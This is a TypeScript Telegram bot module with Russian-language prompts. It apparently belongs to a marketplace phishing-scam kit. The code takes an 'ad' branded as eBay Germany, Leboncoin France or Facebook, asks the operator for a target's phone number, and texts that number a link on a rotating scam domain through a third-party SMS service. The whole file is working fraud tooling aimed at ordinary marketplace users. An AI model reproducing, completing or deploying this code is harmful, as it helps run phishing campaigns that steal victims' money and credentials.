import {Context} from "@/database/models/context";
import {Scene} from "grammy-scenes";
import {Composer, InlineKeyboard} from "grammy";
import {adsRepository, domensRepository} from "@/database";
import {deleteAllMessages} from "@/helpers/deleteAllMessages";
import {sendSms, sendSmsAmNam} from "@/utils/rassilka/sms";
import * as console from "console";
import {getDomen} from "@/helpers/getDomen";
import {getFlagEmoji} from "@/helpers/getFlagEmoji";

export const scene = new Scene<Context>('smsSend')
export const composer = new Composer<Context>()
const regex = /sms ad (?<id>\d+)/gmi
composer.callbackQuery(regex, handler)

async function handler(ctx: Context)  {
    const match = regex.exec(ctx.callbackQuery.data)
    const id = match.groups.id
    await ctx.scenes.enter('smsSend', {
        id
    })
}

async function cancel(ctx) {
    await deleteAllMessages(ctx.session.deleteMessage, ctx)
    ctx.scene.exit()
}

scene.always().callbackQuery('cancel smsSend', cancel)

scene.do(async (ctx) => {
    ctx.session.smsEmail = {ad: Number(ctx.scene.opts.arg.id), to: undefined, pattern: "1", who: undefined}

    const ad = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })

    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }

    const keyb = [
        [{text: 'Hogwarts', callback_data: 'hogwarts'}],
    ]

    // if (ad.country.toLowerCase() === 'de') {
    //     keyb.push([{text: 'amnyam', callback_data: 'amnyam'}])
    // }

    await ctx.reply(`Выбери смсера`, {
        reply_markup: {
            inline_keyboard: keyb
        }
    })
    ctx.scene.resume()
})

scene.wait().callbackQuery(/goose|hogwarts/gmi,async (ctx) => {
    ctx.session.smsEmail.smser = ctx.callbackQuery.data
    const ad = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })

    let text = undefined

    if (ad.service.toLowerCase() === 'facebook' && ad.country.toLowerCase() === 'cz') {
        await ctx.reply(`СМС недоступен для Чехии(`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }

    if (ad.service.toLowerCase() === 'leboncoin' && ad.country.toLowerCase() === 'fr') {
        text = `📲 Введи номер телефона (🇫🇷+33):\n\n<b>Пример: +3315785425397</b>`

        ctx.session.smsEmail.pattern = "fr"
        ctx.session.smsEmail.who = "leboncoin"
    }

    if (ad.service.toLowerCase() === 'ebay' && ad.country.toLowerCase() === 'de') {
        text = `📲 Введи номер телефона (${(getFlagEmoji('de'))}+49):\n\n<b>Пример: +4915785425397</b>`

        ctx.session.smsEmail.pattern = "de"
        ctx.session.smsEmail.who = "ebay"
    }

    const msg = await ctx.reply(text, {
        reply_markup:  new InlineKeyboard()
            .text('Отмена', 'cancel smsSend')
    })
    ctx.session.deleteMessage = []
    ctx.session.deleteMessage.push(msg.message_id)
    ctx.scene.resume()
})


scene.wait().on('message:text', async ctx => {
    ctx.session.smsEmail.to = ctx.msg.text
    ctx.session.deleteMessage.push(ctx.msg.message_id)

    const ad = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }

    ad.phone = ctx.session.smsEmail.to
    await adsRepository.save(ad)
    const domen = await getDomen(ctx.user,ad.service)
    if (!domen) {
        await ctx.reply(`domen undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }
    let response = undefined


    response = await sendSms(ctx.session.smsEmail.to, ctx.session.smsEmail.pattern, ctx.session.smsEmail.who,`https://${domen.link}/link/${ad.link}?phone=goose`, ctx.from.id)
    const msg = await ctx.reply(`⏳`)
    try {
        await ctx.api.deleteMessage(ctx.chat.id,msg.message_id)
    } catch (e) {}
    await ctx.reply(
        (response?.data?.status === "true")
            ? `✅ Отправлено`
            : `⚠️ Не удалось отправить смс`,
        {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })


    return cancel(ctx)
})